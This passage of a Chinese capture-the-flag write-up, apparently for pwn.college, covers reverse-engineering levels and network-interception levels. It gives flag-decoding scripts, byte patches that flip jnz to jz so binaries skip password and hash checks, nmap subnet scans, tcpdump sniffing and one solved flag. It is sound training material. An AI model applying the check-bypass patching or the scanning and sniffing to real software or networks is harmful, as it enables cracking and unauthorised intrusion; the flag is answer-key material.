class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wrong! No flag for you!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>参考上述伪代码我很快写出脚本，但是运行出来不正确，有两个字节无法解释为ASCII码，除了循环里的元素交换，这里也涉及到了元素交换，于是研究这段代码：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面三行代码的意思是将索引为 15 和 24 的元素互换位置，这里需要根据正确答案的起始索引进行计算</span></span><br><span class="line">v3 = HIBYTE(v11);  <span class="comment">// v11是64位int类型，v3获取其高8位，v11地址为 $rbp-0x28</span></span><br><span class="line">HIBYTE(v11) = v13; <span class="comment">// v13地址为 $rsp-0x18</span></span><br><span class="line">LOBYTE(v13) = v3;  <span class="comment">// 将v13的低8位设为v11的高八位</span></span><br><span class="line"><span class="comment">/* 通过gdb调试得到下面的结果，也就是将 0x52 和 0x68 互换</span></span><br><span class="line"><span class="comment">(gdb) x/gx $rbp-0x28</span></span><br><span class="line"><span class="comment">0x7fff397e3e28: 0x527ed69cf35b6fdf</span></span><br><span class="line"><span class="comment">(gdb) x/gx $rbp-0x18</span></span><br><span class="line"><span class="comment">0x7fff397e3e38: 0x000000be9be64a68</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//过程同上</span></span><br><span class="line">v4 = BYTE4(buf);</span><br><span class="line">BYTE4(buf) = BYTE6(v12);</span><br><span class="line">BYTE6(v12) = v4;</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>或者修改<code>buf</code>的类型，改为<code>char buf[29]</code>，这样就可以直接看见交换了哪两个元素</p>
</blockquote>
<p>最终脚本：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0x40</span>,  <span class="number">0xf3</span>,  <span class="number">0x82</span>,  <span class="number">0xd6</span>,  <span class="number">0x9b</span>,  <span class="number">0x57</span>,  <span class="number">0xe2</span>,  <span class="number">0x98</span>,  <span class="number">0xdf</span>,  <span class="number">0x6f</span>,  <span class="number">0x5b</span>,  <span class="number">0xf3</span>,  <span class="number">0x9c</span>,  <span class="number">0xd6</span>,  <span class="number">0x7e</span>,  <span class="number">0x68</span>,  <span class="number">0xff</span>,  <span class="number">0x94</span>,  <span class="number">0xd0</span>,  <span class="number">0x68</span>,  <span class="number">0x52</span>,  <span class="number">0xfd</span>,  <span class="number">0x63</span>,  <span class="number">0xc5</span>, <span class="number">0x52</span>,  <span class="number">0x4a</span>,  <span class="number">0xe6</span>,  <span class="number">0x9b</span>,  <span class="number">0xc3</span>]</span><br><span class="line">s2 = [<span class="number">0xb4</span>, <span class="number">0xec</span>, <span class="number">0x96</span>, <span class="number">0x33</span>, <span class="number">0xa</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">l, a, b</span>):</span><br><span class="line">	tmp = l[a]</span><br><span class="line">	l[a] = l[b]</span><br><span class="line">	l[b] = tmp</span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">4</span>, <span class="number">22</span>)</span><br><span class="line">swap(s1, <span class="number">15</span>, <span class="number">24</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">14</span>):</span><br><span class="line">	tmp = s1[k]</span><br><span class="line">	s1[k] = s1[<span class="number">28</span>-k]</span><br><span class="line">	s1[<span class="number">28</span>-k] = tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	s1[i] = s1[i] ^ s2[i%<span class="built_in">len</span>(s2)]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">14</span>):</span><br><span class="line">	tmp = s1[k]</span><br><span class="line">	s1[k] = s1[<span class="number">28</span>-k]</span><br><span class="line">	s1[<span class="number">28</span>-k] = tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	flag += <span class="built_in">chr</span>(s1[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level8.0：同7.0</p>
<p>wp：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xe8</span>, <span class="number">0xb9</span>, <span class="number">0x7b</span>, <span class="number">0xe4</span>, <span class="number">0x85</span>, <span class="number">0xb5</span>, <span class="number">0xa5</span>, <span class="number">0xab</span>, <span class="number">0xea</span>, <span class="number">0xdc</span>, <span class="number">0x77</span>, <span class="number">0xf2</span>, <span class="number">0xbc</span>, <span class="number">0x33</span>, <span class="number">0xd9</span>, <span class="number">0x2c</span>, <span class="number">0x35</span>, <span class="number">0xed</span>, <span class="number">0x23</span>, <span class="number">0x05</span>, <span class="number">0x2d</span>, <span class="number">0x6d</span>, <span class="number">0x2a</span>, <span class="number">0x6f</span>, <span class="number">0x0a</span>, <span class="number">0xef</span>, <span class="number">0x75</span>, <span class="number">0x68</span>, <span class="number">0xa1</span>, <span class="number">0x53</span>, <span class="number">0x3d</span>, <span class="number">0xa7</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x91</span>, <span class="number">0xa1</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">l, a, b</span>):</span><br><span class="line">	tmp = l[a]</span><br><span class="line">	l[a] = l[b]</span><br><span class="line">	l[b] = tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)//<span class="number">2</span>):</span><br><span class="line">	swap(s1, i, <span class="built_in">len</span>(s1)-<span class="number">1</span>-i)</span><br><span class="line"></span><br><span class="line">x1 = <span class="number">0xed1b2fb3ae</span></span><br><span class="line">length = <span class="built_in">round</span>(x1.bit_length()/<span class="number">8</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">		s1[i] = s1[i] ^ (x1 &gt;&gt; ((length-<span class="number">1</span> - i%length)*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">s2 = [<span class="number">0x8d95e5</span>, <span class="number">0xd58ddf</span>, <span class="number">0x77f189e87646</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s2)):</span><br><span class="line">	length = <span class="built_in">round</span>(s2[j].bit_length()/<span class="number">8</span>)  <span class="comment"># 获取字节数</span></span><br><span class="line">	<span class="built_in">print</span>(length)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">		s1[i] = s1[i] ^ (s2[j] &gt;&gt; ((length-<span class="number">1</span> - i%length)*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">s1.sort()  <span class="comment"># 排序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	flag += <span class="built_in">chr</span>(s1[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level8.1：同7.1，感觉题目给的提示不够，需要遍历所有排列组合？</p>
<p>wp：首先通过gdb找到目标十六进制</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55f97ee2b020: 0xd8    0x9a    0x0f    0x91    0xf4    0x63    0x77    0xc8</span><br><span class="line">0x55f97ee2b028: 0x88    0x18    0x91    0xbc    0x47    0x5c    0xfc    0xb3</span><br><span class="line">0x55f97ee2b030: 0x20    0xa4    0xa0    0x25    0x38    0x8b    0x84    0x53</span><br><span class="line">0x55f97ee2b038: 0xe4    0x96    0x1e    0xf1    0x4d    0x38    0xa2    0x27</span><br><span class="line">0x55f97ee2b040: 0x50    0xd6    0xc1 </span><br></pre></td></tr></tbody></table></figure>
<p>根据IDA的反编译伪代码得到下面的脚本，但是不知道冒泡排序之前的数组元素顺序，无法得到flag</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xd8</span>, <span class="number">0x9a</span>, <span class="number">0x0f</span>, <span class="number">0x91</span>, <span class="number">0xf4</span>, <span class="number">0x63</span>, <span class="number">0x77</span>, <span class="number">0xc8</span>, <span class="number">0x88</span>, <span class="number">0x18</span>, <span class="number">0x91</span>, <span class="number">0xbc</span>, <span class="number">0x47</span>, <span class="number">0x5c</span>, <span class="number">0xfc</span>, <span class="number">0xb3</span>, <span class="number">0x20</span>, <span class="number">0xa4</span>, <span class="number">0xa0</span>, <span class="number">0x25</span>, <span class="number">0x38</span>, <span class="number">0x8b</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xe4</span>, <span class="number">0x96</span>, <span class="number">0x1e</span>, <span class="number">0xf1</span>, <span class="number">0x4d</span>, <span class="number">0x38</span>, <span class="number">0xa2</span>, <span class="number">0x27</span>, <span class="number">0x50</span>, <span class="number">0xd6</span>, <span class="number">0xc1</span>]</span><br><span class="line">s2 = [<span class="number">0xe7</span>, <span class="number">0x16</span>, <span class="number">0x9f</span>, <span class="number">0xe</span>, <span class="number">0x91</span>, <span class="number">0x33</span>]</span><br><span class="line">s3 = [<span class="number">0x27</span>, <span class="number">0x65</span>, <span class="number">0xf3</span>, <span class="number">0x68</span>, <span class="number">0x1f</span>, <span class="number">0x9a</span>, <span class="number">0x80</span>]</span><br><span class="line">s4 = [<span class="number">0x9</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x38</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">l, a, b</span>):</span><br><span class="line">	tmp = l[a]</span><br><span class="line">	l[a] = l[b]</span><br><span class="line">	l[b] = tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">35</span>):</span><br><span class="line">	s1[j] ^= s3[j%<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">4</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">17</span>):</span><br><span class="line">	swap(s1, n, <span class="number">34</span>-n)</span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">12</span>, <span class="number">23</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for k in range(0, 34):  # 冒泡排序</span></span><br><span class="line"><span class="string">	for m in range(0, 34-k):</span></span><br><span class="line"><span class="string">		if s1[m] &gt; s1[m+1]:</span></span><br><span class="line"><span class="string">			swap(s1, m, m+1)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">35</span>):</span><br><span class="line">	s1[j] ^= s2[j%<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">35</span>):</span><br><span class="line">	s1[i] ^= s4[i%<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> s1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level9.0：此挑战允许修补二进制文件中的5个字节。（先做level10.0）</p>
<p>wp：同10.0</p></li>
<li><p>level9.1：同上</p></li>
<li><p>level10.0：修改一个字节得到flag。</p>
<p>wp：从discord那得到了提示，通过修改一个字节达到修改汇编指令的目的。先运行目标文件以及通过IDA查看运行逻辑，如下：</p>
<blockquote>
<p>输入地址偏移量--&gt;输入修改值--&gt;对应地址的值变为修改值--&gt;输入字符串--&gt;MD5--&gt;比较</p>
</blockquote>
<p>通过IDA查看汇编指令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000021B4                 call    _memcmp  # 返回值为rax</span><br><span class="line">.text:00000000000021B9                 test    eax, eax  # 两个值相与</span><br><span class="line">.text:00000000000021BB                 jnz     short loc_21D1</span><br></pre></td></tr></tbody></table></figure>
<p>若<code>test</code>指令结果不为0，则会跳转到失败函数中，所以这里将<code>jnz</code>改为<code>jz</code>就不会跳到失败函数中，根据这个<a target="_blank" rel="noopener" href="http://ref.x86asm.net/coder64.html">网站</a>找到两个<strong>指令对应的十六进制</strong>。下一步就是需要确定偏移量的值。同gdb打开目标文件，直接查看<code>main</code>函数</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001cf0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x0000000000001cf4 &lt;+4&gt;:     push   rbp</span><br><span class="line">   ......</span><br><span class="line">   ......</span><br><span class="line">   0x0000000000001d7b &lt;+139&gt;:   call   0x11b0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001d80 &lt;+144&gt;:   mov    edi,0xa</span><br><span class="line"></span><br><span class="line">   0x0000000000001ea9 &lt;+441&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001eae &lt;+446&gt;:   call   0x1280 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000001eb3 &lt;+451&gt;:   lea    rdi,[rip+0x14b7]        # 0x3371</span><br><span class="line">   0x0000000000001eba &lt;+458&gt;:   mov    eax,0x0</span><br><span class="line">   .......</span><br><span class="line">   0x0000000000001ed5 &lt;+485&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001eda &lt;+490&gt;:   call   0x1280 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000001edf &lt;+495&gt;:   movzx  ecx,BYTE PTR [rbp-0xc3]</span><br><span class="line">   .......</span><br><span class="line">(gdb) b *main+446  # 在第一个scanf处设置断点</span><br><span class="line">Breakpoint 1 at 0x1eae</span><br><span class="line">(gdb) run</span><br><span class="line">......</span><br><span class="line">Changing byte 1/1.</span><br><span class="line">Offset (hex) to change:</span><br><span class="line">Breakpoint 1, 0x00005627f9b96eae in main ()</span><br><span class="line">(gdb) bt</span><br><span class="line">#0  0x00005627f9b96eae in main ()</span><br><span class="line">(gdb) x/gx $rbp-0xa8   # 起始地址</span><br><span class="line">0x7fff68699ee8: 0x00005627f9b95000</span><br><span class="line">(gdb) disas main   # 再次查看main函数中的指令，此时每条指令有具体的地址</span><br><span class="line">0x00005627f9b971b4 &lt;+1220&gt;:  call   0x5627f9b96290 &lt;memcmp@plt&gt;</span><br><span class="line">0x00005627f9b971b9 &lt;+1225&gt;:  test   eax,eax</span><br><span class="line">0x00005627f9b971bb &lt;+1227&gt;:  jne    0x5627f9b971d1 &lt;main+1249&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>得到<code>jne</code>的地址与起始地址相差<code>0x21bb</code>，即偏移量为<code>0x21bb</code>，再次运行目标文件：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Changing byte 1/1.</span><br><span class="line">Offset (hex) to change: 0x21bb</span><br><span class="line">New value (hex): 0x74</span><br><span class="line">The byte has been changed: *0x55dca42621bb = 74.</span><br></pre></td></tr></tbody></table></figure>
<p>然后任意输入几个字符串，回车得到flag</p></li>
<li><p>level10.1：同上</p></li>
<li><p>level11.0：可以修改两个字节，但是会检查文件完整性（哈希值）</p>
<p>wp：使用IDA查看伪代码，发现<code>memcmp</code>使用了两次（先比较哈希值，然后比较md5值），所以修改这两次条件跳转即可</p></li>
<li><p>level11.1：修改两个字节，检查文件完整性</p>
<p>wp：我一开始以为和11.0是一样的，但是输入两个修改字节后总是会有<code>Segmentation fault</code>，于是打开IDA查看两个条件跳转的十六进制（左边是地址，右边是指令的十六进制形式）：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x1B4D:    0F 85 E3 00 00 00</span><br><span class="line">0x1C32:    75 2C</span><br></pre></td></tr></tbody></table></figure>
<p>经过查询，有下面的知识点：</p>
<blockquote>
<p>在 x86 和 x86-64 指令集中，<code>jne</code>
指令有两种编码方式，这取决于跳转的目标距离（即跳转的字节偏移量）。</p>
<ol type="1">
<li><strong>短跳转</strong>：使用 8 位偏移量进行跳转，偏移量范围为 -128
到 127 字节。这种情况下，<code>jne</code> 的操作码为
<code>75</code>。</li>
<li><strong>长跳转</strong>：使用 32 位偏移量进行跳转，偏移量范围为
-2,147,483,648 到 2,147,483,647 字节。这种情况下，<code>jne</code>
的操作码为 <code>0F 85</code>。</li>
</ol>
</blockquote>
<p>所以输入偏移量时注意对应的字节：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Changing byte 1/2.</span><br><span class="line">Offset (hex) to change: 0x1b4e</span><br><span class="line">New value (hex): 0x84</span><br><span class="line">The byte has been changed: *0x55a4b4324b4e = 84.</span><br><span class="line">Changing byte 2/2.</span><br><span class="line">Offset (hex) to change: 0x1c32</span><br><span class="line">New value (hex): 0x74</span><br><span class="line">The byte has been changed: *0x55a4b4324c32 = 74.</span><br></pre></td></tr></tbody></table></figure>
<p>然后任意输入几个字符，回车得到flag</p></li>
</ul>
<h2 id="intercepting-communication">Intercepting Communication</h2>
<h3 id="知识点-4">知识点</h3>
<ul>
<li>以太网：通过Mac地址通信</li>
<li>IP协议：首部结构</li>
<li>TCP协议：首部结构，标志位</li>
<li>ARP协议</li>
<li>三次握手</li>
<li>工具：nc、tcpdump、ip、ifconfig、nmap</li>
</ul>
<h3 id="练习-4">练习</h3>
<ul>
<li><p>level1：连接远程主机</p>
<p>wp：监听目标主机的特定端口</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.0.3 31337</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level2：监听特定端口</p>
<p>wp：监听本地计算机上的端口</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 31337</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level3：查找同一子网下的IP并监听31337端口</p>
<p>wp：使用nmap扫描同一子网下的IP，找到目标IP，然后使用nc连接对应端口</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-0-2:~# nmap 10.0.0.0/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-28 09:54 UTC</span><br><span class="line">Nmap scan report for 10.0.0.129</span><br><span class="line">Host is up (0.000015s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">31337/tcp open  Elite</span><br><span class="line">MAC Address: 2A:AF:7A:12:1A:FC (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.0.0.2</span><br><span class="line">Host is up (0.000010s latency).</span><br><span class="line">All 1000 scanned ports on 10.0.0.2 are closed</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 30.76 seconds</span><br><span class="line">root@ip-10-0-0-2:~# nc 10.0.0.129 31337</span><br><span class="line">pwn.college{oLZJSPC2WRMKubBDqz6KTgcvMm2.dFjNzMDLycDMyUzW}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level4：在一个很大范围的子网中找到并连接目标主机</p>
<p>wp：与上一关解法相同，但是运行时间太长了</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  10.0.0.0/16</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5：监测远程主机的流量</p>
<p><code>tcpdump</code>
是一个命令行数据包分析器，它可以捕获和分析网络流量。要监测特定端口上的流量</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0&lt;网络接口&gt; port 31337  </span><br></pre></td></tr></tbody></table></figure>
<p><code>tcpdump</code>
可以显示数据包的内容。要查看数据包的实际内容（包括负载），可以使用
<code>-X</code> （显示数据包的十六进制和ASCII内容）或 <code>-A</code>
选项（只显示数据包的ASCII内容）。</p>
<p>wp：首先通过<code>ifconfig</code>查看网络接口</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.0.2  netmask 255.255.0.0  broadcast 0.0.0.0</span><br><span class="line">        inet6 fe80::60f7:ff:fe14:fbea  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 62:f7:00:14:fb:ea  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 43  bytes 3498 (3.4 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 20  bytes 1668 (1.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536    # 用于本地通信</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></tbody></table></figure>
<p>发现<code>eth0</code>接口，然后使用
<code>tcpdump -A -i eth0 port 31337</code> 得到flag</p></li>
<li><p>level6：监控远程主机的慢速流量（其实就是一个一个字符发送）</p>
<p>wp：如果直接用<code>tcpdump -A -i eth0 port 31337</code>，会显示一大堆没用的信息，不过可以得知是<code>10.0.0.3</code>向本机发送数据，可以使用命令<code>tcpdump -A -i eth0 src host 10.0.0.3 and dst host 10.0.0.2</code>，发现每次发送一个字符，所以可以用下面的脚本提取字符串：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    buffer = []</span><br><span class="line">    recording = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> sys.stdin:</span><br><span class="line">        line = line.rstrip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 当检测到包含 "length 1" 的行时</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'length 1'</span> <span class="keyword">in</span> line:</span><br><span class="line">            recording = <span class="literal">True</span></span><br><span class="line">            buffer = []</span><br><span class="line">        <span 